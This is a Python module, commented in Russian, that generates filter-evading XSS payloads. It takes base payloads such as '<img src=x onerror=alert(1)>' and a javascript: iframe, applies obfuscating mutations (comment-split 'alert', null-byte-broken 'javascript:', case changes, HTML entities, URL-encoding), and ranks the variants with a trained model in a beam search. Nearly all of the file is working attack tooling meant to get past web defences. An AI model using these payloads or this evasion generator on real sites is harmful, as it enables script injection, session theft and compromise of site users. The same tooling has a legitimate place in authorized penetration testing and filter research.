import urllib.parse
from typing import List, Tuple

from .model_infer import XSSPayloadScorer


def simple_mutations(payload: str) -> List[str]:
    """
    Примитивный мутатор: из одного пейлоада делает набор вариантов.
    Цель – немного менять синтаксис/обфускацию, сохраняя общую структуру.
    """
    variants = set()

    p = payload.strip()
    variants.add(p)

    # 1. Замена кавычек
    variants.add(p.replace('"', "'"))
    variants.add(p.replace("'", '"'))

    # 2. Разные формы alert/prompt/confirm
    if "alert" in p:
        variants.add(p.replace("alert", "prompt"))
        variants.add(p.replace("alert", "confirm"))
    if "prompt" in p:
        variants.add(p.replace("prompt", "alert"))
    if "confirm" in p:
        variants.add(p.replace("confirm", "alert"))

    # 3. Вставка комментариев внутрь функции (alert → al/*x*/ert)
    if "alert" in p:
        variants.add(p.replace("alert", "al/*x*/ert"))
    if "prompt" in p:
        variants.add(p.replace("prompt", "pr/*x*/ompt"))

    # 4. Варианты регистра
    variants.add(p.lower())
    variants.add(p.upper())
    # Смешанный: тег в верхнем регистре, JS как есть
    if "<img" in p.lower():
        variants.add(p.replace("<img", "<IMG"))
    if "<iframe" in p.lower():
        variants.add(p.replace("<iframe", "<IFRAME"))

    # 5. Игры с пробелами вокруг '=' и атрибутов
    if " =" in p:
        variants.add(p.replace(" =", "="))
    if "=" in p:
        variants.add(p.replace("=", " ="))
    variants.add(p.replace("  ", " "))  # сжатие двойных пробелов

    # 6. Замена <img / <image, иногда помогает/ломает фильтры
    if "<img" in p.lower():
        variants.add(p.replace("<img", "<image"))
    if "<image" in p.lower():
        variants.add(p.replace("<image", "<img"))

    # 7. HTML-entities для угловых скобок/кавычек (частично)
    html_encoded = (
        p.replace("<", "&#60;")
         .replace(">", "&#62;")
    )
    variants.add(html_encoded)

    # только кавычки в entities
    variants.add(
        p.replace('"', "&#34;").replace("'", "&#39;")
    )

    # 8. Варианты javascript: (разрыв, комментарий)
    if "javascript:" in p:
        variants.add(p.replace("javascript:", "java\u0000script:"))
        variants.add(p.replace("javascript:", "java//x\nscript:"))

    # 9. Добавление ; и комментария в конец JS
    if ")" in p and "alert" in p or "prompt" in p or "confirm" in p:
        variants.add(p.replace(")", ");"))
        variants.add(p.replace(")", ")//x"))

    # 10. Полное URL-кодирование (как если бы мы передавали в параметре)
    variants.add(urllib.parse.quote(p))

    return list(variants)


def generate_and_score(
    base_payloads: List[str],
    top_k: int = 10,
    model_path: str = None,
) -> List[Tuple[str, float]]:
    """
    Берёт список базовых пейлоадов,
    генерирует для каждого набор мутаций,
    оценивает их через модель
    и возвращает top_k лучших по вероятности.
    """
    import os
    if model_path is None:
        # Пытаемся найти модель по умолчанию
        base_dir = os.path.dirname(os.path.abspath(__file__))
        default_model = os.path.join(base_dir, "trained", "xss_model.pt")
        if os.path.exists(default_model):
            model_path = default_model
        else:
            raise FileNotFoundError(f"Модель не найдена: {default_model}")
    
    scorer = XSSPayloadScorer(model_path=model_path, device_preference="cpu")

    all_candidates: List[str] = []
    for base in base_payloads:
        muts = simple_mutations(base)
        all_candidates.extend(muts)

    # убираем дубликаты, сохраняя порядок
    all_candidates = list(dict.fromkeys(all_candidates))

    print(f"Сгенерировано кандидатов: {len(all_candidates)}")

    scores = scorer.predict_batch(all_candidates)
    combined = list(zip(all_candidates, scores))
    combined.sort(key=lambda x: x[1], reverse=True)

    return combined[:top_k]


def improve_payload(
    payload: str,
    rounds: int = 2,
    beam_size: int = 10,
    model_path: str = None,
) -> List[Tuple[str, float]]:
    """
    «Улучшалка» пейлоада:
    - стартуем с одного (возможно, нерабочего) пейлоада,
    - на каждом шаге применяем simple_mutations ко всем текущим кандидатам,
    - оцениваем через модель,
    - оставляем top-K лучших (beam search по вероятности успеха),
    - возвращаем итоговый список (payload, score).

    Так мы пытаемся найти близкие по структуре варианты с максимальной вероятностью успеха.
    """
    import os
    if model_path is None:
        # Пытаемся найти модель по умолчанию
        base_dir = os.path.dirname(os.path.abspath(__file__))
        default_model = os.path.join(base_dir, "trained", "xss_model.pt")
        if os.path.exists(default_model):
            model_path = default_model
        else:
            raise FileNotFoundError(f"Модель не найдена: {default_model}")
    
    scorer = XSSPayloadScorer(model_path=model_path, device_preference="cpu")

    # Инициализация: один кандидат — исходный пейлоад
    beam = {payload}
    for r in range(rounds):
        new_candidates = set()
        for cand in beam:
            muts = simple_mutations(cand)
            for m in muts:
                new_candidates.add(m)

        # убираем исходный beam, чтобы чуть расширить пространство, но можно и оставить
        all_candidates = list(new_candidates)

        print(f"[Раунд {r+1}] кандидатов: {len(all_candidates)}")

        # оцениваем моделью
        scores = scorer.predict_batch(all_candidates)
        combined = list(zip(all_candidates, scores))
        combined.sort(key=lambda x: x[1], reverse=True)

        # выбираем top beam_size
        beam = {p for p, s in combined[:beam_size]}

    # финальная оценка для beam
    final_list = list(beam)
    final_scores = scorer.predict_batch(final_list)
    result = list(zip(final_list, final_scores))
    result.sort(key=lambda x: x[1], reverse=True)
    return result


if __name__ == "__main__":
    # Пример 1: как раньше — генерация из двух рабочих базовых пейлоадов
    base_payloads = [
        "<iframe src='javascript:alert(`xss`)'>",
        "<img src=x onerror=alert(1)>",
    ]

    print("=== TOP кандидаты от базовых пейлоадов ===")
    top = generate_and_score(base_payloads, top_k=10)
    for p, s in top:
        print(f"Пейлоад: {p}\nСкор: {s:.3f}\n{'-'*40}")

    # Пример 2: улучшение заведомо слабого/нерботающего пейлоада
    bad_payload = '<img src="livescript:document.vulnerable=true;">'
    print("\n=== Улучшение потенциально нерабочего пейлоада ===")
    improved = improve_payload(bad_payload, rounds=2, beam_size=10)
    for p, s in improved[:10]:
        print(f"Пейлоад: {p}\nСкор: {s:.3f}\n{'-'*40}")
